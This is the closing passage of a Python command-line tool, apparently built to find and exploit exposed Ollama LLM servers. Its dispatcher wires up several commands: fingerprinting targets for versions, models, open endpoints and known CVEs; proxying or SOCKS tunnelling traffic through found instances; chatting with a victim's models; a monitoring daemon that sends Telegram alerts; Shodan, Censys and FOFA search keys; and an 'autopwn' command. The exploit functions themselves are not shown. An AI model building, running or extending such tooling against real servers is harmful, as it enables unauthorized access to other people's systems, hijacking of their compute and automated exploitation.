    
    elif args.command == "ps":
        cmd_ps(args)
    
    elif args.command == "embed":
        cmd_embed(args)
    
    elif args.command == "generate":
        cmd_generate(args)
    
    elif args.command == "proxy":
        if args.socks:
            start_socks_proxy(args.target, args.port, args.host)
        else:
            start_proxy(args.target, args.port, args.host)
    
    elif args.command == "chat":
        if args.batch:
            batch_chat(args.target, args.batch)
        else:
            interactive_chat(args.target)
    
    elif args.command == "fingerprint":
        if args.target:
            log(f"🔍 Deep fingerprinting {args.target}...", "INFO")
            fp = fingerprint_instance(args.target)
            print(f"\n{C.BOLD}{C.MAGENTA}{'='*70}{C.END}")
            print(f"{C.BOLD}  🦙 Fingerprint: {args.target}{C.END}")
            print(f"{C.BOLD}{'='*70}{C.END}")
            print(f"  {C.CYAN}Status:{C.END}       {fp.get('status', 'unknown')}")
            print(f"  {C.CYAN}Version:{C.END}       {fp['version']}")
            print(f"  {C.CYAN}Models:{C.END}        {fp['model_count']} ({', '.join(fp['models'][:8])})")
            if fp['model_count'] > 8:
                print(f"                   ... and {fp['model_count']-8} more")
            if fp.get('running_models'):
                print(f"  {C.CYAN}Running:{C.END}      {', '.join(fp['running_models'])} ({fp['running_count']})")
            print(f"  {C.CYAN}Total Size:{C.END}    {fp['total_size_human']}")
            print(f"  {C.CYAN}Response:{C.END}      {fp['response_time_ms'].get('total', '?')}ms")
            
            if fp['model_details']:
                print(f"\n  {C.BOLD}Model Details:{C.END}")
                for md in fp['model_details'][:10]:
                    print(f"    {C.GREEN}{md['name']}{C.END} — {md['size_human']}")
            
            print(f"\n  {C.CYAN}CVEs:{C.END}          {len(fp['cves'])}")
            for cve in fp['cves']:
                print(f"     {C.RED}⚠ {cve['id']}: {cve['desc']} [{cve['severity']}] (CVSS:{cve.get('cvss','?')}){C.END}")
            
            if fp.get('gpu_info'):
                print(f"\n  {C.CYAN}GPU Info:{C.END}     {fp['gpu_info']}")
            
            if fp.get('accessible_endpoints'):
                print(f"\n  {C.CYAN}Open Endpoints:{C.END}")
                for ep in fp['accessible_endpoints'][:15]:
                    print(f"    ✓ {ep}")
            
            print(f"{C.MAGENTA}{'='*70}{C.END}\n")
            
        elif args.all:
            instances = load_found()
            if not instances:
                log("No instances in database. Run scan first.", "WARN")
                return
            for inst in instances:
                target = f"{inst['ip']}:{inst.get('port', 11434)}"
                log(f"🔍 Fingerprinting {target}...", "INFO")
                fp = fingerprint_instance(target)
                inst["fingerprint"] = fp
                save_found(inst)
    
    elif args.command == "export":
        instances = load_found()
        if not instances:
            log("No instances to export. Run scan first.", "WARN")
            return
        do_export(instances, args.format)
    
    elif args.command == "show":
        instances = load_found()
        show_instances(instances, args.geo)
        if args.export:
            do_export(instances, args.export)
    
    elif args.command == "monitor":
        cfg = get_config()
        if args.notify:
            cfg["notify_on_find"] = True
        if args.export:
            cfg["auto_export"] = True
            cfg["export_format"] = args.export
        save_config(cfg)
        monitoring_daemon(args.interval, args.random)
    
    elif args.command == "config":
        if args.show:
            cfg = get_config()
            # Mask sensitive values
            sensitive = ["telegram_token", "shodan_key", "censys_id", "censys_secret", "fofa_key"]
            for k in sensitive:
                if cfg.get(k) and len(str(cfg[k])) > 8:
                    v = str(cfg[k])
                    cfg[k] = v[:4] + "..." + v[-4:]
            print(json.dumps(cfg, indent=2))
        elif args.set:
            k, v = args.set
            cfg = get_config()
            cfg[k] = v
            save_config(cfg)
            log(f"✅ Set {k} = {v[:4]}...{v[-4:]}" if len(v) > 8 else f"✅ Set {k} = {v}", "OK")
        else:
            if args.telegram_token:
                cfg = get_config(); cfg["telegram_token"] = args.telegram_token; save_config(cfg)
                log("✅ Telegram token set", "OK")
            if args.telegram_chat:
                cfg = get_config(); cfg["telegram_chat_id"] = args.telegram_chat; save_config(cfg)
                log("✅ Telegram chat ID set", "OK")
            if args.shodan_key:
                cfg = get_config(); cfg["shodan_key"] = args.shodan_key; save_config(cfg)
                log("✅ Shodan key set", "OK")
    
    elif args.command == "autopwn":
        autopwn(args.random, not args.no_vuln, args.port)


if __name__ == "__main__":
    main()
